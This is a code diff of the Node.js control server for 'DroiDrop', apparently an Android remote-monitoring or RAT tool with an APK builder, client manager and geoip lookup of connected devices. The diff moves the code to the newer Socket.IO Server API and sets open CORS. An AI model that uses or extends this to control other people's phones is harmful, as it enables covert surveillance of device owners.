@@ -1,14 +1,14 @@
-/* 
-*   DroiDrop
-*   An Android Monitoring Tools
-*   By t.me/efxtv
+/*
+* DroiDrop
+* An Android Monitoring Tools
+* By t.me/efxtv
 */
-
 
 const
     express = require('express'),
     app = express(),
-    IO = require('socket.io'),
+    http = require('http'), // Import the http module
+    { Server } = require("socket.io"), // Import the Server class from socket.io
     geoip = require('geoip-lite'),
     CONST = require('./includes/const'),
     db = require('./includes/databaseGateway'),
@@ -23,11 +23,19 @@ global.app = app;
 global.clientManager = clientManager;
 global.apkBuilder = apkBuilder;
 
-// spin up socket server
-let client_io = IO.listen(CONST.control_port);
+// Create an HTTP server from the Express app
+const server = http.createServer(app);
 
-client_io.sockets.pingInterval = 30000;
-client_io.on('connection', (socket) => {
+// Initialize Socket.IO with the HTTP server
+const io = new Server(server, {
+  cors: {
+    origin: "*", // Esto permite conexiones desde cualquier origen (puedes ajustarlo por seguridad)
+    methods: ["GET", "POST"]
+  }
+});
+
+io.pingInterval = 30000;
+io.on('connection', (socket) => {
     socket.emit('welcome');
     let clientParams = socket.handshake.query;
     let clientAddress = socket.request.connection;
@@ -50,7 +58,7 @@ client_io.on('connection', (socket) => {
         var onevent = socket.onevent;
         socket.onevent = function (packet) {
             var args = packet.data || [];
-            onevent.call(this, packet);    // original call
+            onevent.call(this, packet);     // original call
             packet.data = ["*"].concat(args);
             onevent.call(this, packet);      // additional call to catch-all
         };
@@ -63,14 +71,20 @@ client_io.on('connection', (socket) => {
 
 });
 
+// Listen on the HTTP server for both web and socket connections
+server.listen(CONST.control_port, () => {
+  console.log(`Socket.IO server listening on port: ${CONST.control_port}`);
+});
 
-// get the admin interface online
-app.listen(CONST.web_port);
+// Also start the Express app for the web interface
+app.listen(CONST.web_port, () => {
+  console.log(`Web server listening on port: ${CONST.web_port}`);
+});
 
-/* 
-*   
-*   
-*   t.me/efxtv
+/*
+*
+*
+* t.me/efxtv
 */
 
 app.set('view engine', 'ejs');
